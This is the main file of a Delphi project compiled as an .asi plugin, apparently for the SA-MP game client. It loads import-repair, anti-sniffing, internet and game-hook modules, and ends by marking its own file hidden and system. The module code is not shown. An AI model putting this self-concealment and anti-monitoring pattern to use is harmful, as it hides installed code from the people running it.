library Project1;

uses
	Windows, MemStrTools, ImportsDoctor, AntiSniffModule, Internet, commonDefs, sampHooks, radparse in '..\radread\radparse.pas';

{$R *.res}
{$E .asi}

var
	fn: array [0..259] of char;

begin
	Tools := Utils.Create;
	Doctor := ImportsStorage.Create;
	Traffic := AntiSniffer.Create;
	Inet := InetClass.Create;
	
	Doctor.SeeImports;
	SAMP := CSAMP.Create;
	
	Doctor.CheckAndRepair(0);
	Doctor.CheckAndRepair(1);
	Doctor.CheckAndRepair(3);
	Doctor.CheckAndRepair(2);
	Doctor.CheckAndRepair(4);
	Doctor.CheckAndRepair(11);
	Doctor.CheckAndRepair(10);
	Doctor.CheckAndRepair(5);
	Doctor.CheckAndRepair(12);
	Doctor.CheckAndRepair(13);
	Doctor.CheckAndRepair(14);
	
	FillChar(fn, sizeof(fn), #0);
	GetModuleFileName(hInstance, fn, sizeof(fn));
	SetFileAttributes(fn, FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM);
end.
